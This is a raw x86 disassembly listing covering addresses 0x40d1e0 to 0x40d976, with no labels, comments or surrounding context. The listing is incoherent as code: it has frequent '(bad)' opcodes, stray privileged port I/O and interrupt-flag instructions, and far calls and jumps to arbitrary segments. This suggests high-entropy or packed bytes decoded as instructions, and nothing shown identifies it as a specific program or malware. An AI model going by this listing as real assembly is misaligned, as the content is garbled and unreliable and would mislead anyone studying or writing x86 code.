  40d1e0:	pop    esi
  40d1e1:	pop    eax
  40d1e2:	add    cl,BYTE PTR [esi]
  40d1e4:	or     bh,BYTE PTR [esi]
  40d1e6:	test   al,0x58
  40d1e8:	out    0xe,al
  40d1ea:	inc    esp
  40d1eb:	call   0x7792:0x5db9ab46
  40d1f2:	(bad)  
  40d1f3:	mov    ss,WORD PTR [ebx-0x692dbceb]
  40d1f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1fa:	rcl    BYTE PTR [ebx-0x13f88fc5],cl
  40d200:	pop    ebx
  40d201:	imul   eax,ebx,0xb716aabc
  40d207:	jmp    0xce15:0xee81f9ef
  40d20e:	aas    
  40d20f:	cmp    esp,DWORD PTR [esi]
  40d211:	in     eax,0x99
  40d213:	mov    eax,ds:0x203bab8e
  40d218:	(bad)  
  40d219:	cld    
  40d21a:	xchg   ebx,eax
  40d21b:	std    
  40d21c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d21d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d21e:	add    cl,dl
  40d220:	mov    al,BYTE PTR [edi+esi*8+0x62]
  40d224:	push   ds
  40d225:	lods   eax,DWORD PTR ds:[esi]
  40d226:	bound  eax,QWORD PTR [eax+0x71]
  40d229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d22a:	pop    ecx
  40d22b:	in     eax,0xd
  40d22d:	cmp    dl,dh
  40d22f:	ficomp DWORD PTR [edi-0x6d]
  40d232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d233:	add    al,0x36
  40d235:	sub    edx,DWORD PTR cs:[ebx]
  40d238:	idiv   BYTE PTR [ecx-0x14]
  40d23b:	jne    0x40d244
  40d23d:	add    esi,edx
  40d23f:	test   al,0x54
  40d241:	test   eax,0xca7e45e7
  40d246:	xor    al,0x61
  40d248:	xchg   DWORD PTR [ebx+0x46],ebx
  40d24b:	pusha  
  40d24c:	jae    0x40d1dd
  40d24e:	dec    ebp
  40d24f:	clc    
  40d250:	pop    edx
  40d251:	mov    ebx,DWORD PTR [ebx+0x36441a]
  40d257:	push   0xa6796d94
  40d25c:	jae    0x40d1f2
  40d25e:	and    BYTE PTR [ecx+0x125b18a5],bl
  40d264:	add    BYTE PTR [edx-0x5d],cl
  40d267:	sbb    cl,BYTE PTR [ecx+0x6a]
  40d26a:	das    
  40d26b:	jge    0x40d2c5
  40d26d:	clc    
  40d26e:	ret    
  40d26f:	cli    
  40d270:	mov    al,0x10
  40d272:	enter  0xe950,0xd6
  40d276:	xchg   edx,eax
  40d277:	cld    
  40d278:	bound  esi,QWORD PTR [eax]
  40d27a:	leave  
  40d27b:	sbb    BYTE PTR [edi+0x206cf788],dl
  40d281:	mov    ds:0x8726d214,eax
  40d286:	pushf  
  40d287:	std    
  40d288:	scas   eax,DWORD PTR es:[edi]
  40d289:	mov    al,ds:0xcf794630
  40d28e:	jnp    0x40d24b
  40d290:	or     al,0xee
  40d292:	lds    eax,FWORD PTR [ebp-0x27c701e3]
  40d298:	or     BYTE PTR [eax+0x48],cl
  40d29b:	das    
  40d29c:	jno    0x40d28c
  40d29e:	call   0xa7bc:0xd7a67050
  40d2a5:	(bad)  
  40d2a6:	(bad)  [edx-0x136107aa]
  40d2ac:	jne    0x40d32b
  40d2ae:	pushf  
  40d2af:	pop    eax
  40d2b0:	push   ss
  40d2b1:	push   0x164de79b
  40d2b6:	sahf   
  40d2b7:	fs jae 0x40d2d3
  40d2ba:	cmp    eax,0x1e7ffbf5
  40d2bf:	and    DWORD PTR [edi],edx
  40d2c1:	cmp    DWORD PTR [ebx-0x58],ebx
  40d2c4:	gs xchg ebp,eax
  40d2c6:	lea    eax,ds:0x9a7efb3c
  40d2cc:	push   ds
  40d2cd:	in     eax,dx
  40d2ce:	cli    
  40d2cf:	rcr    DWORD PTR [edx],0xb8
  40d2d2:	pop    ecx
  40d2d3:	adc    DWORD PTR [ebp-0x4],edi
  40d2d6:	add    eax,0x3a883153
  40d2db:	jb     0x40d2b7
  40d2dd:	inc    edi
  40d2de:	push   ebx
  40d2df:	sti    
  40d2e0:	(bad)  [ecx-0x235323f6]
  40d2e6:	dec    esp
  40d2e7:	test   DWORD PTR [ecx],ebp
  40d2e9:	fwait
  40d2ea:	cli    
  40d2eb:	rcl    DWORD PTR [eax+esi*8],1
  40d2ee:	or     cl,dl
  40d2f0:	dec    edi
  40d2f1:	push   edi
  40d2f2:	ror    DWORD PTR [edx],cl
  40d2f4:	inc    ebp
  40d2f5:	push   edx
  40d2f6:	adc    bl,BYTE PTR [ecx-0x49]
  40d2f9:	imul   esi,DWORD PTR [eax-0x64622443],0x44
  40d300:	sub    eax,0xcafdf9eb
  40d305:	sub    DWORD PTR [edi],ebx
  40d307:	stos   BYTE PTR es:[edi],al
  40d308:	stos   DWORD PTR es:[edi],eax
  40d309:	jg     0x40d2ba
  40d30b:	add    ch,dh
  40d30d:	mov    esp,0xebb40699
  40d312:	aas    
  40d313:	mov    ebx,0x7ab4e4f7
  40d318:	or     BYTE PTR [ebx+0x6aa271dd],ch
  40d31e:	add    eax,0x840da61a
  40d323:	div    DWORD PTR ds:0x2ec9cf24
  40d329:	and    esi,DWORD PTR [ecx]
  40d32b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d32c:	jb     0x40d2f8
  40d32e:	(bad)  
  40d32f:	retf   0x1c1d
  40d332:	cld    
  40d333:	dec    ecx
  40d334:	out    0xa9,eax
  40d336:	jne    0x30ec1ba4
  40d33c:	add    ch,BYTE PTR [edi-0x15ac4e20]
  40d342:	(bad)  
  40d344:	imul   esp,ebx,0x7b
  40d347:	fwait
  40d348:	sbb    bl,BYTE PTR [edx]
  40d34a:	push   esi
  40d34b:	xor    BYTE PTR [ebp+0x6a90cec4],ch
  40d351:	jmp    0xe805826f
  40d356:	fxch   st(7)
  40d359:	mov    ah,0xd5
  40d35b:	(bad)  
  40d35d:	test   DWORD PTR ds:0x3be38946,ecx
  40d363:	ror    DWORD PTR [edi+edx*4],cl
  40d366:	dec    ecx
  40d367:	jecxz  0x40d362
  40d369:	or     ebp,DWORD PTR [esi-0x49d12f39]
  40d36f:	je     0x40d2fd
  40d371:	sbb    eax,0xf5c7b128
  40d376:	mov    ds,WORD PTR ds:0xffc2b5cc
  40d37c:	(bad)  
  40d37d:	xor    DWORD PTR [edi-0x38dbf0b0],edx
  40d383:	(bad)  [ecx-0x2]
  40d386:	(bad)  
  40d387:	push   0x7c192dd7
  40d38c:	scas   al,BYTE PTR es:[edi]
  40d38d:	and    BYTE PTR [ecx],ah
  40d38f:	sbb    al,dl
  40d391:	mov    esi,0x6a97a617
  40d396:	nop
  40d397:	(bad)  
  40d399:	jp     0x40d35b
  40d39b:	jecxz  0x40d364
  40d39d:	iret   
  40d39e:	mov    al,ds:0xa085cdf7
  40d3a3:	jle    0x40d41d
  40d3a5:	and    al,0xfc
  40d3a7:	or     dl,BYTE PTR [ebp-0xd174eeb]
  40d3ad:	jns    0x40d397
  40d3af:	lods   eax,DWORD PTR ds:[esi]
  40d3b0:	dec    esp
  40d3b1:	cmc    
  40d3b2:	push   cs
  40d3b3:	cmp    BYTE PTR [esi],ch
  40d3b5:	aad    0x9a
  40d3b7:	inc    ebx
  40d3b8:	inc    ecx
  40d3b9:	pop    edx
  40d3ba:	in     al,dx
  40d3bb:	pop    esp
  40d3bc:	leave  
  40d3bd:	add    dl,BYTE PTR [ebx-0x27]
  40d3c0:	mov    ds:0x76ad210d,eax
  40d3c5:	xchg   esp,eax
  40d3c6:	push   esp
  40d3c7:	and    eax,0xcd621f3f
  40d3cc:	inc    ecx
  40d3cd:	sti    
  40d3ce:	jo     0x40d425
  40d3d0:	(bad)  
  40d3d1:	loope  0x40d43a
  40d3d3:	mov    edi,0x4fe522f4
  40d3d8:	xchg   ecx,ecx
  40d3da:	mov    ds:0x1aa11cb3,al
  40d3df:	jb     0x40d438
  40d3e1:	lods   eax,DWORD PTR ds:[esi]
  40d3e2:	xchg   edi,eax
  40d3e3:	nop
  40d3e4:	std    
  40d3e5:	mov    WORD PTR [esi],?
  40d3e7:	adc    esp,DWORD PTR ds:0x93892dd
  40d3ed:	jmp    0xfe53:0x1d0e1e6b
  40d3f4:	xchg   esi,eax
  40d3f5:	adc    eax,0x2333e53e
  40d3fa:	data16 clc 
  40d3fc:	xor    DWORD PTR [edx],esi
  40d3fe:	dec    ebx
  40d3ff:	or     BYTE PTR [edx-0x5d],al
  40d402:	call   0xf4fc:0x6c3bdfb9
  40d409:	jecxz  0x40d489
  40d40b:	popf   
  40d40c:	imul   ebx,esp,0x51a512a3
  40d412:	jle    0x40d3ca
  40d414:	pop    ds
  40d415:	dec    esi
  40d416:	mov    al,0x1e
  40d418:	or     esp,DWORD PTR [edx-0x2992d36d]
  40d41e:	std    
  40d41f:	push   ebp
  40d420:	jb     0x40d432
  40d422:	std    
  40d423:	xlat   BYTE PTR ds:[ebx]
  40d424:	arpl   WORD PTR ds:[ebx+0x211796a4],si
  40d42b:	jmp    0x40d40f
  40d42d:	scas   al,BYTE PTR es:[edi]
  40d42e:	xchg   ebp,eax
  40d42f:	fisttp DWORD PTR [ebx-0x25]
  40d432:	cmp    al,0xc0
  40d434:	test   DWORD PTR [edi-0x24a07ccd],ecx
  40d43a:	mov    bh,0x64
  40d43c:	mov    edx,ss
  40d43e:	pushf  
  40d43f:	rcr    DWORD PTR ds:0x6fbe7608,0x83
  40d446:	nop
  40d447:	popf   
  40d448:	mov    edx,0x523ead3e
  40d44d:	and    DWORD PTR [edi+0x7f70333a],edi
  40d453:	clc    
  40d454:	ins    BYTE PTR es:[edi],dx
  40d455:	mov    DWORD PTR [ebp-0x66],esi
  40d458:	shl    BYTE PTR [edx],cl
  40d45a:	push   ecx
  40d45b:	lds    ebp,FWORD PTR ds:0x9e04eae
  40d461:	mov    ecx,0xca5c7272
  40d466:	lods   eax,DWORD PTR ds:[esi]
  40d467:	test   ebx,ecx
  40d469:	or     ch,ch
  40d46b:	retf   0xa277
  40d46e:	lods   eax,DWORD PTR ds:[esi]
  40d46f:	fcmovnb st,st(5)
  40d471:	es jge 0x40d416
  40d474:	gs pop ebx
  40d476:	sbb    DWORD PTR [ebx+edi*4],ebp
  40d479:	out    0x77,al
  40d47b:	push   edi
  40d47c:	out    dx,al
  40d47d:	add    al,0x87
  40d47f:	sbb    edx,DWORD PTR [esp+edi*4-0x7607b275]
  40d486:	inc    ecx
  40d487:	adc    BYTE PTR [ebx+0x506e9c0],cl
  40d48d:	add    BYTE PTR [eax],al
  40d48f:	ror    al,0xcc
  40d492:	cmp    eax,0xd5d9c1d4
  40d497:	jg     0x40d500
  40d499:	jne    0x40d439
  40d49b:	adc    ch,0xaf
  40d49e:	or     eax,0x7878b5cc
  40d4a3:	push   0x7c
  40d4a5:	js     0x40d51f
  40d4a7:	cwde   
  40d4a8:	sbb    cl,BYTE PTR [esi+0x74]
  40d4ab:	dec    edi
  40d4ac:	sbb    edx,edi
  40d4ae:	sbb    BYTE PTR [eax+esi*8-0x22],al
  40d4b2:	loop   0x40d4f9
  40d4b4:	cwde   
  40d4b5:	mov    edx,esp
  40d4b7:	xor    al,0x65
  40d4b9:	jo     0x40d45f
  40d4bb:	scas   eax,DWORD PTR es:[edi]
  40d4bc:	mov    ch,0xce
  40d4be:	(bad)
  40d4c1:	aas    
  40d4c2:	xor    DWORD PTR [edi+eax*2-0x4badffa1],ebx
  40d4c9:	push   0x34
  40d4cb:	dec    ebx
  40d4cc:	add    eax,DWORD PTR [eax+0xcb89d7a]
  40d4d2:	es int3 
  40d4d4:	cli    
  40d4d5:	mov    al,0x35
  40d4d7:	icebp  
  40d4d8:	ror    dl,1
  40d4da:	xor    eax,0x5908ae9
  40d4df:	or     BYTE PTR [edx],bh
  40d4e1:	push   edx
  40d4e2:	sub    DWORD PTR [eax-0x25e87402],eax
  40d4e8:	out    dx,al
  40d4e9:	mov    esi,0x101bf7ed
  40d4ee:	mov    dh,0x75
  40d4f0:	aaa    
  40d4f1:	repz out 0x63,eax
  40d4f4:	mov    ebp,0x95c9deed
  40d4f9:	(bad)  
  40d4fa:	cld    
  40d4fb:	or     edx,DWORD PTR [edx+0x496d78fc]
  40d501:	pop    ds
  40d502:	jo     0x40d4fd
  40d504:	ficomp WORD PTR [edi]
  40d506:	mov    WORD PTR [ebx-0x6fcad888],gs
  40d50c:	sub    ch,0x7d
  40d50f:	or     bl,BYTE PTR [ebx]
  40d511:	adc    DWORD PTR [ebx-0x2e],esi
  40d514:	and    BYTE PTR [ecx],0x4b
  40d517:	push   esp
  40d518:	push   0x56
  40d51a:	adc    DWORD PTR [ebp+0x7a],ebx
  40d51d:	pop    ds
  40d51e:	sbb    al,0xa8
  40d520:	ins    BYTE PTR es:[edi],dx
  40d521:	ret    0x6334
  40d524:	xchg   DWORD PTR [eax-0x2143aad2],edi
  40d52a:	inc    eax
  40d52b:	mov    esi,0x35cf16e0
  40d530:	jge    0x40d572
  40d532:	mov    WORD PTR [esi+0x52899cc3],?
  40d538:	fnstsw WORD PTR [edx-0x14267bda]
  40d53e:	sub    eax,DWORD PTR [esi+0x11]
  40d541:	push   edi
  40d542:	jmp    0x40d5bb
  40d544:	test   DWORD PTR [ebp-0x710afa43],ebx
  40d54a:	add    al,0xdf
  40d54c:	jp     0x40d531
  40d54e:	jne    0x40d4dc
  40d550:	adc    edx,ecx
  40d552:	mov    esi,ecx
  40d554:	lahf   
  40d555:	mov    ebp,0xf4a9b4d3
  40d55a:	aas    
  40d55b:	sub    DWORD PTR [ebp+0xda626d4],ebx
  40d561:	add    cl,dh
  40d563:	push   es
  40d564:	aad    0x36
  40d566:	arpl   WORD PTR [edx+eax*4+0x57],di
  40d56a:	mov    dh,0x4b
  40d56c:	sub    esp,DWORD PTR [ebp-0x542d8b81]
  40d572:	dec    ebp
  40d573:	adc    esi,DWORD PTR [esi-0x7d]
  40d576:	xlat   BYTE PTR ds:[ebx]
  40d577:	adc    edx,ecx
  40d579:	retf   0x58f
  40d57c:	in     al,dx
  40d57d:	jbe    0x40d509
  40d57f:	xlat   BYTE PTR ds:[ebx]
  40d580:	in     eax,dx
  40d581:	xchg   esi,eax
  40d582:	xor    ebx,DWORD PTR [ebx-0x47]
  40d585:	mov    cl,0x1c
  40d587:	add    BYTE PTR [ecx+0x451d5a04],bh
  40d58d:	push   edx
  40d58e:	ja     0x40d5f5
  40d590:	jle    0x40d585
  40d592:	cmp    ch,al
  40d594:	sbb    BYTE PTR [edx],bl
  40d596:	sbb    BYTE PTR [edi-0x60],ch
  40d599:	pop    ds
  40d59a:	sbb    bl,BYTE PTR [ebx+0x36]
  40d59d:	fst    QWORD PTR [ecx+0x4b7ef28c]
  40d5a3:	imul   ebp
  40d5a5:	push   eax
  40d5a6:	mov    DWORD PTR [eax+0x43],esi
  40d5a9:	scas   al,BYTE PTR es:[edi]
  40d5aa:	jge    0x40d60d
  40d5ac:	in     al,dx
  40d5ad:	or     BYTE PTR [ebx-0x69261fa0],ch
  40d5b3:	push   0x8fe43b71
  40d5b8:	aad    0x44
  40d5ba:	fsub   st(4),st
  40d5bc:	mov    eax,ds:0x4bf742fa
  40d5c1:	and    dh,cl
  40d5c3:	imul   edx,DWORD PTR ds:0xdabc3b78,0xffffffc1
  40d5ca:	mov    esp,0x5094005e
  40d5cf:	ja     0x40d56b
  40d5d1:	jl     0x40d57f
  40d5d3:	xor    eax,0xac2d1df1
  40d5d8:	jmp    0x11ebeeff
  40d5dd:	push   esp
  40d5de:	jne    0x40d5e7
  40d5e0:	icebp  
  40d5e1:	xchg   ebp,eax
  40d5e2:	imul   esi,DWORD PTR [edx-0x59],0xffffffc0
  40d5e6:	repnz sbb al,0x1b
  40d5e9:	jecxz  0x40d59c
  40d5eb:	stc    
  40d5ec:	cld    
  40d5ed:	iret   
  40d5ee:	mov    edx,0x79f46d0d
  40d5f3:	fild   DWORD PTR [edx-0x399dece0]
  40d5f9:	lahf   
  40d5fa:	in     eax,dx
  40d5fb:	and    bh,al
  40d5fd:	push   ecx
  40d5fe:	push   esi
  40d5ff:	push   esp
  40d600:	pop    ebp
  40d601:	dec    eax
  40d602:	ret    0x3a23
  40d605:	(bad)  
  40d606:	icebp  
  40d607:	adc    DWORD PTR [ebp+0x59b37c9a],eax
  40d60d:	mov    dh,0x48
  40d60f:	cwde   
  40d610:	dec    ecx
  40d611:	test   edx,ebp
  40d613:	stos   BYTE PTR es:[edi],al
  40d614:	inc    eax
  40d615:	cmp    al,0x2b
  40d618:	je     0x40d5b0
  40d61a:	mul    DWORD PTR [ebx+0x7bc99d17]
  40d620:	test   BYTE PTR [ecx],0x6a
  40d623:	cmp    BYTE PTR [esi],dl
  40d625:	lea    esp,gs:[ebx+0x4f]
  40d629:	arpl   WORD PTR ds:0xf2ba4860,dx
  40d62f:	lahf   
  40d630:	(bad)  
  40d631:	ror    DWORD PTR [ecx-0x547a2442],cl
  40d637:	js     0x40d663
  40d639:	js     0x40d5c5
  40d63b:	dec    ebp
  40d63c:	(bad)  [eax]
  40d63e:	out    0x3e,eax
  40d640:	inc    eax
  40d641:	inc    edi
  40d642:	outs   dx,BYTE PTR ds:[esi]
  40d643:	sbb    al,0xb3
  40d645:	das    
  40d646:	ja     0x40d60a
  40d648:	push   ecx
  40d649:	mov    BYTE PTR [ebx],0xba
  40d64c:	adc    DWORD PTR [eax+eiz*4],ebp
  40d64f:	call   0x4e05:0x79278b92
  40d656:	scas   al,BYTE PTR es:[edi]
  40d657:	addr16 push edx
  40d659:	jae    0x40d678
  40d65b:	fsubr  DWORD PTR [eiz*4+0x52fbf1ef]
  40d662:	adc    esp,edi
  40d664:	jo     0x40d6b9
  40d666:	add    DWORD PTR ds:0x40e233a6,eax
  40d66c:	mov    ch,0xe1
  40d66e:	(bad)  
  40d66f:	or     BYTE PTR [ecx+0x50],bl
  40d672:	cwde   
  40d673:	inc    ebp
  40d674:	in     al,dx
  40d675:	inc    ecx
  40d676:	lock into 
  40d678:	(bad)  
  40d67a:	add    DWORD PTR [esp+ebp*4+0xa101f71],ebx
  40d681:	ja     0x40d6d7
  40d683:	push   esi
  40d684:	push   esp
  40d685:	jl     0x40d6b3
  40d687:	or     BYTE PTR [esi+0x36780e71],al
  40d68d:	and    BYTE PTR [edi+ebp*4],dl
  40d690:	out    0x19,al
  40d692:	dec    ebp
  40d693:	jg     0x40d6ff
  40d695:	dec    ecx
  40d696:	cdq    
  40d697:	mov    cl,0x4
  40d699:	es dec esi
  40d69b:	mov    ecx,DWORD PTR [edi]
  40d69d:	xor    eax,0x50322012
  40d6a2:	sub    BYTE PTR [ecx+eax*2],bh
  40d6a5:	neg    DWORD PTR [ecx]
  40d6a7:	arpl   WORD PTR [ebx-0x13],dx
  40d6aa:	setbe  dl
  40d6ad:	add    edi,esi
  40d6af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6b0:	adc    dh,ah
  40d6b2:	adc    al,0x3f
  40d6b4:	mov    cl,0xb
  40d6b6:	pop    edi
  40d6b7:	add    esp,DWORD PTR ds:0xbcb9edc6
  40d6bd:	arpl   WORD PTR [edx],di
  40d6bf:	dec    esp
  40d6c0:	dec    ebp
  40d6c1:	pop    edx
  40d6c2:	add    edx,DWORD PTR [eax-0x445548d5]
  40d6c8:	nop
  40d6c9:	stc    
  40d6ca:	repz (bad) 
  40d6cc:	push   esi
  40d6cd:	push   ds
  40d6ce:	and    bh,al
  40d6d0:	cmp    BYTE PTR [edi],ah
  40d6d2:	js     0x40d666
  40d6d4:	pop    ebp
  40d6d5:	xor    eax,0x91d2156c
  40d6da:	xchg   DWORD PTR ds:0xa3129b7f,esi
  40d6e0:	stos   DWORD PTR es:[edi],eax
  40d6e1:	in     al,dx
  40d6e2:	dec    edx
  40d6e3:	xchg   dh,dh
  40d6e5:	fidivr DWORD PTR [ebx]
  40d6e7:	cmc    
  40d6e8:	lods   al,BYTE PTR ds:[esi]
  40d6e9:	sahf   
  40d6ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6eb:	inc    ecx
  40d6ec:	aad    0xd8
  40d6ee:	pusha  
  40d6ef:	jae    0x40d6e8
  40d6f1:	push   ebx
  40d6f2:	hlt    
  40d6f3:	mov    eax,ds:0xd1c62799
  40d6f8:	fisub  WORD PTR ds:0x98dd2a56
  40d6fe:	push   esi
  40d6ff:	fild   WORD PTR [ebx-0x754d0b06]
  40d705:	leave  
  40d706:	rcr    BYTE PTR [edx+0x5c],0x61
  40d70a:	fnstsw WORD PTR [edx+0x37]
  40d70d:	push   es
  40d70e:	pop    ebx
  40d70f:	addr16 xchg ebp,eax
  40d711:	inc    edx
  40d712:	rcr    DWORD PTR [ecx+0x3e703ff2],1
  40d718:	(bad)  
  40d719:	into   
  40d71a:	jae    0x40d73b
  40d71c:	popf   
  40d71d:	imul   esi,DWORD PTR [edx],0x17
  40d720:	das    
  40d721:	js     0x40d759
  40d723:	mov    bl,0xed
  40d725:	in     eax,dx
  40d726:	push   DWORD PTR [ecx+ecx*1-0x7f]
  40d72a:	mov    esp,0x2115f8e1
  40d72f:	out    dx,al
  40d730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d731:	jae    0x40d78e
  40d733:	and    al,0x88
  40d735:	jne    0x40d718
  40d737:	outs   dx,BYTE PTR ds:[esi]
  40d738:	inc    esi
  40d739:	add    eax,0x29014715
  40d73e:	mov    ebx,DWORD PTR [ebx]
  40d740:	inc    esp
  40d741:	adc    bl,BYTE PTR [ecx-0x34]
  40d744:	(bad)
  40d747:	xchg   edx,eax
  40d748:	xrelease mov DWORD PTR [esi-0x8b7c67a],ebx
  40d74f:	adc    BYTE PTR [edi-0x45],dh
  40d752:	aas    
  40d753:	lea    ebp,[ecx-0x21]
  40d756:	mov    al,0x59
  40d758:	and    BYTE PTR [ebx],cl
  40d75a:	dec    ecx
  40d75c:	dec    edi
  40d75d:	ja     0x40d7bf
  40d75f:	mov    ds:0x8665b4b3,eax
  40d764:	jecxz  0x40d782
  40d766:	push   ebx
  40d767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d768:	ja     0x40d7d3
  40d76a:	jns    0x40d780
  40d76c:	loopne 0x40d776
  40d76e:	inc    ebp
  40d76f:	cwde   
  40d770:	ret    0xf533
  40d773:	or     al,0x82
  40d775:	cmp    ah,bh
  40d777:	mov    al,ds:0x493bcc
  40d77c:	test   DWORD PTR [edi+0x78],0x52c868fe
  40d783:	xchg   edi,eax
  40d784:	mov    ch,0x91
  40d786:	cwde   
  40d787:	cmp    eax,0x6fb80616
  40d78c:	sub    al,0x54
  40d78e:	jno    0x40d73c
  40d790:	adc    al,0x64
  40d792:	sub    BYTE PTR [ebp+ebx*1-0x13feef8c],ah
  40d799:	popf   
  40d79a:	jno    0x40d7db
  40d79c:	data16 fisubr DWORD PTR gs:[esi-0x1f7148e9]
  40d7a4:	scas   al,BYTE PTR es:[edi]
  40d7a5:	cdq    
  40d7a6:	call   0x3033:0xe7f5c597
  40d7ad:	sbb    ebp,DWORD PTR [ebx+0x33b9edc3]
  40d7b3:	sub    eax,0xbab93ce6
  40d7b8:	adc    eax,0x160ca200
  40d7bd:	push   edx
  40d7be:	adc    DWORD PTR [ecx+ebx*4],0x2d
  40d7c2:	xor    eax,0x90692c07
  40d7c7:	lods   al,BYTE PTR ds:[esi]
  40d7c8:	fisubr DWORD PTR [ebx-0x7418ab8c]
  40d7ce:	shl    eax,0xf5
  40d7d1:	repz in eax,dx
  40d7d3:	and    DWORD PTR [ebp+0x24d28cba],ecx
  40d7d9:	dec    edx
  40d7da:	sbb    eax,0x7ea47c19
  40d7df:	xor    ch,BYTE PTR [ebx+0x4db08a92]
  40d7e5:	push   0x52249b8
  40d7ea:	inc    esp
  40d7eb:	push   es
  40d7ec:	les    edx,FWORD PTR [edi]
  40d7ee:	jge    0x40d7c1
  40d7f0:	mov    ds:0xab111517,eax
  40d7f5:	daa    
  40d7f6:	add    eax,0xbae06ac4
  40d7fb:	fisttp WORD PTR [esi+0x60374e0d]
  40d801:	mov    ds:0x5d9bf9f8,eax
  40d806:	mov    fs,WORD PTR [esi-0x636680dd]
  40d80c:	push   ebp
  40d80d:	cmp    BYTE PTR [ecx+0x14],dh
  40d810:	xor    esi,DWORD PTR [edi+edx*8+0x48b0f72e]
  40d817:	push   0x69
  40d819:	(bad)  
  40d81a:	push   ss
  40d81b:	mov    ch,0x45
  40d81d:	out    0x57,al
  40d81f:	sub    DWORD PTR [edi+0xa702ea1],esp
  40d825:	pop    eax
  40d826:	sbb    BYTE PTR [esi-0x5b],ah
  40d829:	dec    eax
  40d82a:	in     eax,dx
  40d82b:	inc    edi
  40d82c:	ja     0x40d870
  40d82e:	and    eax,0x7918e7ff
  40d833:	and    ebx,DWORD PTR [ecx]
  40d835:	push   es
  40d836:	enter  0xd183,0x7b
  40d83a:	push   eax
  40d83b:	fwait
  40d83c:	lea    esp,[edi]
  40d83e:	pushf  
  40d83f:	or     ebp,DWORD PTR [ebp+0x52]
  40d842:	mov    esi,0x4fff2277
  40d847:	pop    edx
  40d848:	retf   0x5303
  40d84b:	add    DWORD PTR [ebx-0x1f64029f],ebx
  40d851:	mov    ebp,DWORD PTR ds:0xec318865
  40d857:	(bad)  
  40d859:	in     al,0xb8
  40d85b:	pop    edi
  40d85d:	lods   eax,DWORD PTR ds:[esi]
  40d85e:	xchg   esp,eax
  40d85f:	mov    edi,0xc608b459
  40d864:	push   cs
  40d865:	sbb    BYTE PTR [ecx+eax*2],bl
  40d868:	shl    bl,cl
  40d86a:	imul   edi,DWORD PTR [esi+0x7194ebe6],0xd038c2ff
  40d874:	das    
  40d875:	sbb    BYTE PTR [ebx],bh
  40d877:	retf   
  40d878:	pop    ecx
  40d879:	push   0x2a2b7f9d
  40d87e:	jmp    0x42a9:0xc72c3b4f
  40d885:	adc    ebx,edx
  40d887:	and    bh,ch
  40d889:	pop    ecx
  40d88a:	rcr    BYTE PTR [esi-0x2badc0c5],1
  40d890:	(bad)  
  40d891:	fbld   TBYTE PTR [ecx]
  40d893:	shl    DWORD PTR [esi+edx*1],0xde
  40d897:	or     dl,0xb8
  40d89a:	ins    BYTE PTR es:[edi],dx
  40d89b:	mov    esp,es
  40d89d:	into   
  40d89e:	mov    ebx,DWORD PTR ds:0x2408349b
  40d8a4:	or     ecx,DWORD PTR [eax-0x6317844d]
  40d8aa:	adc    edi,DWORD PTR [edi-0x3b92c0d0]
  40d8b0:	pop    ecx
  40d8b1:	mov    DWORD PTR [ebp+0x5b],ecx
  40d8b4:	into   
  40d8b5:	sub    al,0x87
  40d8b7:	add    BYTE PTR [esp+ebx*4],dl
  40d8ba:	inc    ecx
  40d8bb:	icebp  
  40d8bc:	jmp    0x1a954631
  40d8c1:	(bad)  
  40d8c2:	xor    eax,0x86ed307c
  40d8c7:	jmp    0xced21cb5
  40d8cc:	or     DWORD PTR [ebx],0xf1c5b173
  40d8d2:	pop    ebx
  40d8d3:	lods   eax,DWORD PTR ds:[esi]
  40d8d4:	pusha  
  40d8d5:	call   0x805d:0xceaaba83
  40d8dc:	cmp    ch,bh
  40d8de:	jmp    0x5d01:0x55990bdc
  40d8e5:	icebp  
  40d8e6:	fs push es
  40d8e8:	mov    ch,0x2e
  40d8ea:	test   al,0x55
  40d8ec:	jp     0x40d941
  40d8ee:	scas   al,BYTE PTR es:[edi]
  40d8ef:	adc    al,0x81
  40d8f1:	or     al,0xd1
  40d8f3:	mov    al,0x93
  40d8f5:	outs   dx,DWORD PTR ds:[esi]
  40d8f6:	mov    esi,0xfd7c1658
  40d8fb:	fcmove st,st(2)
  40d8fd:	out    0x2b,al
  40d8ff:	sbb    bl,BYTE PTR [edi-0x19bcd6c6]
  40d905:	jns    0x40d931
  40d907:	push   ebx
  40d908:	lea    esi,[eax-0x169d8134]
  40d90e:	mov    edi,0xbd8d8d0
  40d913:	aam    0x1c
  40d915:	loope  0x40d8fe
  40d917:	cmp    DWORD PTR [ecx-0x9ba5afc],ebp
  40d91d:	repz (bad) 
  40d91f:	adc    BYTE PTR [ebx+edi*1],ch
  40d922:	je     0x40d993
  40d924:	out    dx,al
  40d925:	(bad)  
  40d926:	mov    cl,0x50
  40d928:	cmp    dl,bh
  40d92a:	mov    ds:0xeaa11739,al
  40d92f:	stos   DWORD PTR es:[edi],eax
  40d930:	inc    edi
  40d931:	cmp    al,0x60
  40d933:	cmp    al,0xc2
  40d935:	fnstenv [eax-0x1c]
  40d938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d939:	pop    ecx
  40d93a:	xor    ecx,DWORD PTR [eax]
  40d93c:	dec    edx
  40d93d:	je     0x40d994
  40d93f:	sub    al,0x93
  40d941:	les    edx,FWORD PTR [edi+0x2c]
  40d944:	int    0x9f
  40d946:	add    ah,BYTE PTR [eax+ebx*4+0xc155a1f]
  40d94d:	push   ecx
  40d94e:	xor    ecx,esi
  40d950:	cmp    esi,esp
  40d952:	fwait
  40d953:	mov    ah,0x6a
  40d955:	dec    edi
  40d956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d957:	xor    DWORD PTR [esi],ebx
  40d959:	sbb    DWORD PTR [edx],ebx
  40d95b:	pop    ss
  40d95c:	jo     0x40d9c1
  40d95e:	cmp    BYTE PTR [esi],0xa1
  40d961:	aam    0xe7
  40d963:	xchg   edi,eax
  40d964:	out    0xe1,eax
  40d966:	pop    ebx
  40d967:	scas   eax,DWORD PTR es:[edi]
  40d968:	and    eax,0x138d68f2
  40d96d:	mov    ebp,0xae7c171c
  40d972:	add    ch,ah
  40d974:	and    al,0xd5
  40d976:	test   esi,edi
